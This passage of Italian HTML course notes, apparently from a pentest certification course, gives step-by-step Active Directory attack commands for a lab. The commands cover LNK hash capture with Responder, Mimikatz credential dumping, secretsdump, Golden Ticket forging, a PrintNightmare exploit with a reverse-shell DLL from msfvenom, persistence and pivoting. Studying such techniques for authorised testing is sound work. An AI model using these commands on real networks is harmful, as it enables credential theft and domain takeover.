        <li><em>2) </em><em><span style="color:#071ba3;">2) Eseguiamo i seguenti comandi, in ordine, in powershell:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">$objShell = New-Object -ComObject WScript.shell </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk = $objShell.CreateShortcut(&quot;C:\test.lnk&quot;) </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk.TargetPath = &quot;\\192.168.138.149\@test.png&quot; </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk.WindowStyle = 1 </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot; </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk.Description = &quot;Test&quot; </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk.HotKey = &quot;Ctrl+Alt+T&quot; </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">$lnk.Save()</span></p>
      <p></p>
      <p><em>Il link creato lo andremo a collocare nella cartella condivisa</em><em>(facendo in modo che sia il più “in alto” possibile, ecco il perché della @ nel nome) </em></p>
      <p>
      <ol>
        <li>4) <em><span style="color:#071ba3;">4) Nella nostra macchina attaccante eseguiamo Responder:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">sudo responder -I eth0 -dP</span><em>(N.B. su -I dobbiamo mettere come parametro la nostra interfaccia: generalmente è eth0, ma potrebbe anche </em><em></em></p>
      <p><em> essere diversa. Con ifconfig accertiamo)</em></p>
      <p>
      <ol>
        <li>5) <em><span style="color:#071ba3;">5) Non appena un utente entra nella cartella condivisa, riceviamo gli hash.</span></em></li>
      </ol>
      </p>
      <p></p>
      <p></p>
      <p><em>Nel caso in cui gli shares siano esposti, è possibile automatizzare il processo utilizzando CME/NetExec:</em></p>
      <p></p>
      <p>
      <h3>netexec smb 192.168.138.137 -d domain.local -u USER -p PASSWORD -M slinky -o NAME=test SERVER=</h3><span style="color:#ff0000;">IP</span></p>
      <p></p>
      <p></p>
      <p>-------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">GPP attack</span></strong></p>
      <p></p>
      <p><em>Attacco vecchio ma talvolta ancora valido. Consiste nel trovare il file cPassword.</em><em></em></p>
      <p><em></em>
      <ol>
        <li><em>1) </em><em><span style="color:#071ba3;">1) Avviamo metasploit e cerchiamo e usiamo il modulo:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">smb_enum_gpp</span></p>
      <p>
      <ol>
        <li>Trovando cPassword possiamo usare tool <strong><span style="color:#071ba3;">gpp-decrypt</span></strong> (disponibile su Kali) per decrittarne il contenuto</li>
      </ol>
      </p>
      <p></p>
      <p>-------------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">MIMIKATZ</span></strong></p>
      <p></p>
      <p><em>Dopo averlo scaricato da github</em></p>
      <p></p>
      <p><img src="images/126-25.png" alt="images/126-25.png" /></p>
      <p></p>
      <p><em>lo avvio sulla macchina Target (a tal proposito posso scaricarlo sulla mia macchina e passarlo alla macchina target tramite</em><span style="color:#ff0000;">python -m http.server PORT</span><em>dal mio lato e</em><span style="color:#ff0000;">curl -O http://MIO_IP:PORT/mimikatz.exe</span><em>lato target. Oppure scaricarlo direttamente sulla macchina target usando curl e il link di scaricamento)</em></p>
      <p></p>
      <p><em>Avviatolo posso usare diversi moduli:</em></p>
      <p><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">privilege::debug</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">sekurlsa::logonpasswords</span></p>
      <p></p>
      <p><em>E trovo, tra le altre cose (di seguito un esempio):</em></p>
      <p></p>
      <p><img src="images/126-26.png" alt="images/126-26.png" /></p>
      <p></p>
      <p>--------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">NTDS.dit</span></strong></p>
      <p></p>
      <p><em>è il database che conserva i dati di AD (informazioni sugli utenti, sui gruppi, nonché gli hash delle password)</em><em></em></p>
      <p><em></em>
      <ol>
        <li><em>Eseguiamo:</em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">secretsdump.py DOMAIN.local/USER:PASSWORD@IP -just-dc-ntlm</span> → (<em>Versione attuale:</em><span style="color:#ff0000;">impacket-secretsdump</span>)</p>
      <p></p>
      <p><em>Otteremo tutti gli hash.</em><em></em></p>
      <p><em></em>
      <ol>
        <li><em>Possiamo crackare gli hash e per semplificarci la vita, possiamo operare solo sull&#39;ultima parte dell&#39;hash:</em></li>
      </ol>
      </p>
      <p></p>
      <p><img src="images/126-27.png" alt="images/126-27.png" /></p>
      <p><em></em></p>
      <p><em>Per il report, è possibile usare excel (rimando al video del corso per imparare il trick in excel).</em></p>
      <p></p>
      <p>--------------------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">GOLDEN TICKET ATTACK</span></strong></p>
      <p></p>
      <p><em>Ci permette di avere completo accesso ad ogni macchina del dominio</em><em></em></p>
      <p><em></em>
      <ol>
        <li><em>1) </em><em><span style="color:#071ba3;">1) Avviamo mimikatz ed eseguiamo:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">privilege::debug</span></p>
      <p>
      <ol>
        <li>2) <em><span style="color:#071ba3;">2) Eseguiamo:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">lsadump::lsa /inject /name:krbtgt</span></p>
      <p>
      <ol>
        <li>3) <em><span style="color:#071ba3;">3) Prendiamo nota su notepad riguardo:</span></em></li>
      </ol>
      </p>
      <p>
      <ul>
        <li>- <em>- l&#39;SID del dominio:</em></p>
          <p>
        </li>
      </ul><img src="images/126-28.png" alt="images/126-28.png" /></p>
      <p>
      <ul>
        <li>- <em>- l&#39;hash del NTLM:</em></p>
          <p>
        </li>
      </ul><img src="images/126-29.png" alt="images/126-29.png" /></p>
      <p>
      <ol>
        <li>4) <em><span style="color:#071ba3;">4) Generiamo il Golden Ticket:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:SID_INDIVIDUATO_SOPRA /krbtgt:HASH_DEL_NTLM /id:500 /ptt</span></p>
      <p></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-30.png" alt="images/126-30.png" /></p>
      <p>
      <ul>
        <li>- <em>- Su “User” possiamo mettere quello che ci pare, anche uno fake (nell&#39;esempio abbiamo inserito “Administrator”);</em></li>
        <li><em>Il sid e il krbtgt sono quelli annotati sopra;</em></li>
        <li><em>L&#39;id è il 500, quello dell&#39;Admin Account</em></li>
        <li><em>Infine ptt = pass the ticket</em></li>
      </ul><em></em></p>
      <p><em></em>
      <ul>
        <li><em>In questo modo stiamo creando un golden ticket e lo stiamo “passando&quot; alla sessione successiva: si prirà un commando prompt col quale possiamo entrare in qualsiasi computer del dominio!</em></li>
      </ul>
      </p>
      <p>
      <ol>
        <li><em>5) </em><em><span style="color:#071ba3;">5) Per aprire il command prompt eseguiamo:</span></em></li>
      </ol><span style="color:#071ba3;"></span></p>
      <p><span style="color:#071ba3;"></span></p>
      <p><span style="color:#ff0000;">misc::cmd</span></p>
      <p>
      <ol>
        <li>6) <em><span style="color:#071ba3;">6) Possiamo eseguire qualsiasi comando su qualsiasi macchina nel dominio, in questo modo:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">dir \\MACCHINA_TARGET\c$</span></p>
      <p></p>
      <p><em>Esempio dal lab:</em></p>
      <p></p>
      <p><img src="images/126-31.png" alt="images/126-31.png" /></p>
      <p></p>
      <p><em>Un consiglio → scaricare psexec.exe e provare</em><span style="color:#ff0000;">psexec.exe \\MACCHINA_TARGET cmd.exe</span><em>per avere un completo controllo con una shell in quella macchina.</em><em></em></p>
      <p><em>Possiamo anche creare un nostro account e farlo diventare domain admin per una persistenza.</em><em></em></p>
      <p><em>Possiamo provare, infine, anche altri comandi mimikatz.</em></p>
      <p></p>
      <p> --------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">ZEROLOGON</span></strong></p>
      <p></p>
      <p><em>In genere un attacco di questo tipo non viene effettuato in un Pentest perché può distruggere interamente il dominio... è importante il report della vulnerabilità, ma non andare oltre.</em></p>
      <p></p>
      <p><em>Per il </em><em><a href="PJPT_Course--Notes_-_ATTACKING_AD--Additional_AD_attacks--ZeroLogon_116.html">ZeroLogon</a></em><em> check:</em></p>
      <p>
      <ol>
        <li>1) <em><span style="color:#071ba3;">1) Scarichiamo </span></em><em><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></em></li>
      </ol><em></em></p>
      <p><em></em>
      <ol>
        <li>2) <em><span style="color:#071ba3;">2) Eseguiamo:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">python3 zerologon_check.py PC-DC IP</span></p>
      <p></p>
      <p><em>Es:</em></p>
      <p></p>
      <p><img src="images/126-32.png" alt="images/126-32.png" /></p>
      <p>
      <ol>
        <li>3) <em><span style="color:#071ba3;">3) Per l&#39;attacco vero e proprio (che non eseguiremo):</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
      <p></p>
      <p>---------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">PRINTNIGHTMARE</span></strong></p>
      <p></p>
      <p><em>Vulnerabilità relativamente recente (2021-2022)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Punto di forza: non serve authentication ma solo uno user account</em></p>
      <p></p>
      <p><em>Link:</em><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
      <p>
      <ol>
        <li>1) <em><span style="color:#071ba3;">1) Usando come target il DC, eseguiamo:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">rpcdump.py @IP-DC | egrep ‘MS-RPRN|MS-PAR’</span></p>
      <p></p>
      <p><em>(Nella versione attuale, il comando è</em><span style="color:#ff0000;">impacket-rpcdump @IP-DC | egrep ‘MS-RPRN|MS-PAR’</span>)</p>
      <p></p>
      <p><em>Se vediamo questi due messaggi significa che la vulnerabilità è presente:</em></p>
      <p></p>
      <p><img src="images/126-33.png" alt="images/126-33.png" /></p>
      <p>
      <ol>
        <li>2) <em><span style="color:#071ba3;">2) Scarichiamo da github il codice python del CVE-2021-1675</span></em></li>
      </ol><em><span style="color:#071ba3;"></span></em></p>
      <p><em><span style="color:#071ba3;"></span></em>
      <ol>
        <li><em><span style="color:#071ba3;">Generiamo un payload con msfvenom:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=NOSTRO_IP LPORT=4444 -f dll &gt; shell.dll</span></p>
      <p></p>
      <p><em>Al file .dll possiamo dare il nome che vogliamo (nell&#39;esempio abbiamo messo “shell.dll”), idem per la porta in ascolto (nell&#39;esempio abbiamo usato la 4444).</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>L&#39;importante è che l&#39;estensione del file sia .dll</em></p>
      <p>
      <ol>
        <li>4) <em><span style="color:#071ba3;">4) Avviamo un listener con metasploit:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">sudo msfconsole</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">use exploit/multi/handler</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set payload windows/x64/meterpreter/reverse_tcp</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set lhost NOSTRO_IP</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set lport 4444 </span> → O quella che abbiamo scelto in base al payload</p>
      <p><span style="color:#ff0000;">run</span></p>
      <p>
      <ol>
        <li>5) <em><span style="color:#071ba3;">5) Condividiamo la cartella col payload creato usando smbserver di impacket:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">smbserver.py share ‘pwd’ -smb2support</span></p>
      <p></p>
      <p><em>(Nella versione attuale il comando è</em><span style="color:#ff0000;">impacket-smbserver share ‘pwd’ -smb2support</span>)</p>
      <p></p>
      <p><img src="images/126-34.png" alt="images/126-34.png" /></p>
      <p></p>
      <p><em>Infine ci serve un utente (nell&#39;esempio del LAB abbiamo usato fcastle):</em></p>
      <p>
      <ol>
        <li><em><span style="color:#071ba3;">Possiamo utilizzare lo script .py scaricato usando le credenziali di un utente:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">python3 CVE-2021-1675.py DOMAIN.local/USER:PASSWORD@IP ‘\\NOSTRO_IP\share\shell.dll’</span></p>
      <p></p>
      <p><em>Es:</em></p>
      <p></p>
      <p><img src="images/126-35.png" alt="images/126-35.png" /></p>
      <p></p>
      <p><em>Dove </em>\share\shell.dll <em>è il nostro payload </em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>(Se non funziona può essere che Defender è attivato)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>In questo modo otterremo una sessione meterpreter sul listener di metasploit:</em></p>
      <p></p>
      <p><img src="images/126-36.png" alt="images/126-36.png" /></p>
      <p></p>
      <p>---------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">MANTAINING ACCESS</span></strong></p>
      <p></p>
      <p><em>Diverse opzioni:</em></p>
      <p>
      <ol>
        <li>1) <strong><span style="color:#071ba3;">1) Metasploit</span></strong></li>
      </ol>
      </p>
      <p><em>modulo persistence. Es:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">run persistence -h</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">esploit/windows/local/persistence</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">exploit/windows/local/registry_persistence</span></p>
      <p>
      <ol>
        <li>2) <strong><span style="color:#071ba3;">2) Scheduled Tasks</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">run scheduleme</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">run schtaskabuse</span></p>
      <p>
      <ol>
        <li>3) <strong><span style="color:#071ba3;">3) Add a user</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">net user NAME PASSWORD /add</span></p>
      <p></p>
      <p>------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">PIVOTING</span></strong></p>
      <p>
      <ol>
        <li>1) <strong><span style="color:#071ba3;">1) Una volta compromessa una macchina, ci colleghiamo:</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">ssh -i pivot root@IP</span></p>
      <p>
      <ol>
        <li>2) <strong><span style="color:#071ba3;">2) Eseguendo ifconfig o ip a, se scopriamo esserci più reti come nell&#39;esempio seguente</span></strong></p>
          <p>
        </li>
      </ol><img src="images/126-37.png" alt="images/126-37.png" /></p>
      <p><em>in cui troviamo 2 indirizzi ip (10.10.155.5/24 e 10.10.10.5/24), possiamo effettuare il pivoting utilizzando proxychains per collegarci dalla nostra macchina alla seconda rete.</em></p>
      <p>
      <ol>
        <li>3) <strong><span style="color:#071ba3;">3) Andiamo a vedere le impostazioni di proxychains:</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">cat /etc/proxychains4.conf</span></p>
      <p></p>
      <p><em>Ci interessa l&#39;ultima parte del file:</em></p>
      <p></p>
      <p><img src="images/126-38.png" alt="images/126-38.png" /></p>
      <p>
      <ol>
        <li>4) <strong><span style="color:#071ba3;">4) Creiamo una connessione con un vincolo a quella porta (9050):</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">ssh -f -N -D 9050 -i pivot root@IP</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-39.png" alt="images/126-39.png" /></p>
      <p><em>Dove l&#39;IP è l&#39;IP della macchina target</em></p>
      <p>
      <ol>
        <li>5) <strong><span style="color:#071ba3;">5) Possiamo quindi effetuare enumeration e attacchi utilizzando proxychains, ad esempio:</span></strong></li>
      </ol>
      </p>
      <p><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">proxychains nmap -p88 ALTRO-IP</span></p>
      <p></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-40.png" alt="images/126-40.png" /></p>
      <p></p>
      <p><em>In questi casi, usando proxychains, potrebbe funzionare meglio uno scan TCP:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">proxychains nmap ALTRO-IP -sT</span></p>
      <p></p>
      <p><em>Es:</em><em></em></p>
      <p><em></em><img src="images/126-41.png" alt="images/126-41.png" /></p>
      <p></p>
      <p><em>Esempio di attacco:</em></p>
      <p><span style="color:#ff0000;">proxychains GetUserSPNs.py DOMAIN.local/USER:PASSWORD -dc-ip ALTRO-IP -request</span> → (<em>Versione attuale:</em><span style="color:#ff0000;">impacket-GetUserSPNs</span>)</p>
      <p></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-42.png" alt="images/126-42.png" /></p>
      <p><em>(classico kerberoasting attack)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Altro attacco possibile (per avere il Desktop del target):</em></p>
      <p></p>
      <p><span style="color:#ff0000;">proxychains xfreerdp /u:administrator /p:&#39;PASSWORD&#39; /v:ALTRO-IP</span></p>
      <p></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-43.png" alt="images/126-43.png" /></p>
      <p><em>Abbiamo il Desktop del target.</em></p>
      <p></p>
      <p><em>Inoltre se eseguiamo per esempio:</em></p>
      <p><img src="images/126-44.png" alt="images/126-44.png" /></p>
      <p><em>Abbiamo firefox attraverso proxychains (possiamo accedere alla rete attraverso firefox)</em></p>
      <p></p>
      <p>-----------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p></p>
      <p><em>Altro tool interessante:</em></p>
      <p><strong><span style="color:#071ba3;">sshuttle</span></strong></p>
      <p></p>
      <p><span style="color:#ff0000;">sshuttle -r root@ALTRO-IP IP-RANGE-MACCHINA-TARGET --ssh-cmd “ssh -i pivot”</span></p>
      <p></p>
      <p><em>Es:</em><em></em></p>
      <p><em></em><img src="images/126-45.png" alt="images/126-45.png" /></p>
      <p><em>Tenendo aperto il terminale col comando eseguito, se andiamo ad eseguire altri comandi in un altra tab (ad esempio nmap TARGET) è come se le stessimo eseguendo attraverso l&#39;altra macchina (come se usassimo proxychains ma senza usare proxychains all&#39;inizio del comando).</em></p>
      <p></p>
      <p>---------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">CLEANING</span></strong></p>
      <p></p>
      <p><em>Ripristinare tutto così com&#39;era prima del Penetration Testing</em></p>
      <p></p>
      <p>--------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">REPORT</span></strong></p>
      <p></p>
      <p>Il template:</p>
      <p><a href="https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report">https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report</a></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
    </div>
  </body>
</html>

